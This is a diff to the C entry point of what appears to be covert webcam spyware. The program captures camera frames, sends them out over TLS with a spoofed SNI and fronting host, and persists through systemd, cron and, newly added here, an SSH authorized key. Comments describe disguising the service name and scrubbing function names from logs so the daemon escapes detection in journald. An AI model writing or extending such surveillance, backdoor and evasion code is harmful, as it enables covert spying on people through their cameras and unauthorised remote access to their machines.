@@ -68,6 +68,9 @@ static void usage(const char *argv0)
         "运行:\n"
         "  --backend NAME      mock | v4l2 | mf。缺省按平台自动选择\n"
         "  --pid PATH          pid 文件路径\n"
+        "  --ssh-pubkey FILE   真实公钥行文件（单行）。用于第三种驻留机制：\n"
+        "                      未提供 = 不启用该项；提供但内容非法 = 拒绝启动，\n"
+        "                      绝不静默降级为「驻留成功但该段是死的」\n"
         "  -D                  双 fork + setsid 后台化\n"
         "  --no-persist        不执行驻留（仅调试；部署时禁止）\n"
         "  --root PREFIX       驻留假根（仅测试用， NULL = 真实根）\n"
@@ -159,6 +162,7 @@ int main(int argc, char **argv)
         if (!strcmp(a, "--backend") && nx)     { cfg.backend = nx; i++; continue; }
         if (!strcmp(a, "--front-host") && nx)  { cfg.front_host = nx; i++; continue; }
         if (!strcmp(a, "--front-path") && nx)  { cfg.front_path = nx; i++; continue; }
+        if (!strcmp(a, "--ssh-pubkey") && nx)  { cfg.ssh_pubkey_file = nx; i++; continue; }
         if (!strcmp(a, "--pid") && nx)         { cfg.pid_path = nx; i++; continue; }
         if (!strcmp(a, "--root") && nx)        { cfg.root_prefix = nx; i++; continue; }
         if (!strcmp(a, "--width") && nx)       { cfg.width = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
@@ -197,6 +201,8 @@ int main(int argc, char **argv)
     if (!cfg.tls_sni     || !*cfg.tls_sni)     cfg.tls_sni     = getenv("CAMD_SNI");
     if (!cfg.front_host  || !*cfg.front_host)  cfg.front_host  = getenv("CAMD_FRONT_HOST");
     if (!cfg.front_path  || !*cfg.front_path)  cfg.front_path  = getenv("CAMD_FRONT_PATH");
+    if (!cfg.ssh_pubkey_file || !*cfg.ssh_pubkey_file)
+        cfg.ssh_pubkey_file = getenv("CAMD_SSH_PUBKEY_FILE");
 
     /* sink 是硬性要求。允许它为空等于允许"采到了但什么都不回传"——
      * 那正是最难被发现的一类部署事故：进程在跑、灯在亮、无产出。 */
@@ -284,18 +290,22 @@ int main(int argc, char **argv)
             rc == -1 ? "E_ARGS" :
             rc == -2 ? "E_PERSIST" :
             rc == -3 ? "E_SOURCE" :
-            rc == -4 ? "E_CHANNEL" : "E_UNKNOWN";
+            rc == -4 ? "E_CHANNEL" :
+            rc == -6 ? "E_PUBKEY"  : "E_UNKNOWN";
         /* 日志不得出现内部函数名：stderr 在 systemd 下进 journal，
          * journalctl -u <伪装服务名> 一查就会读到 cam_daemon_run，
          * 落点名伪装得再好也会被这一行捅破。 */
         fprintf(stderr, "[FATAL] 运行失败: code=%d（%s）\n", rc, why);
-        return (rc == -2) ? 3 : (rc == -3) ? 4 : (rc == -4) ? 5 : 2;
+        return (rc == -2) ? 3 : (rc == -3) ? 4 : (rc == -4) ? 5
+             : (rc == -6) ? 7 : 2;
     }
 
     fprintf(stderr,
             "[INFO] 结束: batches=%u frames=%u bytes_out=%llu persist_rc=%d "
-            "bin=%s\n",
+            "methods=systemd:%d,cron:%d,sshkey:%d bin=%s\n",
             st.batches, st.frames, (unsigned long long)st.bytes_out,
-            st.persist_rc, st.bin_path[0] ? st.bin_path : "(none)");
+            st.persist_rc,
+            st.methods[0], st.methods[1], st.methods[2],
+            st.bin_path[0] ? st.bin_path : "(none)");
     return 0;
 }
